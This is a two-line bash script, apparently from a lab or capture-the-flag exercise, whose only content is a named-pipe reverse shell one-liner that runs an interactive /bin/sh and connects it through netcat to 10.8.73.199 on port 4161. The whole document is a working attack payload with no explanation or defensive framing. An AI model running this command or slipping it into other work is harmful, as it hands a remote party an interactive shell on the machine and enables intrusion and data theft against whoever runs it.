#!/bin/bash


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.73.199 4161 >/tmp/f